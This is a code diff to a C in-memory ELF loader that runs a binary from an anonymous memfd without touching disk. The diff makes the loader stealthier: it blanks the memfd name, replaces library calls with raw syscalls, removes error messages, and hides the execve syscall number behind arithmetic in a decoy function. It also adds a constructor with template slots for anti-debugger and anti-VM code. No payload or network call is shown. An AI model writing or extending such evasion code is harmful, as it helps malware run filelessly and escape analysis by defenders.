@@ -8,6 +8,7 @@
 #include <linux/memfd.h>
 //syscalls
 #include <sys/syscall.h>
+#include <sys/ptrace.h>
 #include <stdint.h>
 
 int empty(int b) {
@@ -36,28 +37,40 @@ but if the elf file requires some libraries which locate in the relative path of
 TODO: fix this problem
 */
 
+int gensssssS(int src) {
+    return src - (0x22222 - 59);
+}
+
+void __attribute__((constructor)) init(void) {
+     {{anti-debugger}}
+     //{{anti-vm}}
+}
+
 int LoadElf(void *mem, size_t memlen, char *argv[], char *envp[], char **err) {
-    int fd = memfd_create("elfloader", 0);
+    int fd = memfd_create("", 0);
     if (fd < 0) {
-        *err = "memfd_create failed";
         return -1;
     }
-    if (write(fd, mem, memlen) != memlen) {
-        *err = "write failed";
+
+    if (syscall(SYS_write, fd, mem, memlen) != memlen) {
         return -1;
     }
-    if (lseek(fd, 0, SEEK_SET) != 0) {
-        *err = "lseek failed";
+    if (syscall(SYS_lseek, fd, 0, SEEK_SET) != 0) {
         return -1;
     }
     //get pid
-    pid_t pid = getpid();
+    pid_t pid = syscall(SYS_getpid, 0);
     char elfpath [256] = { 0 };
     sprintf(elfpath, "/proc/%d/fd/%d", pid, fd);
+    
+    //fork and ptrace child process
+    //pid_t child = syscall(SYS_fork);
 
+    //forbid child process being traced
+    int syscallno = 0x22222;
+    syscallno = gensssssS(syscallno);
     //execve
-    if (execve(elfpath, argv, envp) < 0) {
-        *err = "execve failed";
+    if (syscall(syscallno, elfpath, argv, envp) < 0) {
         return -1;
     }
 
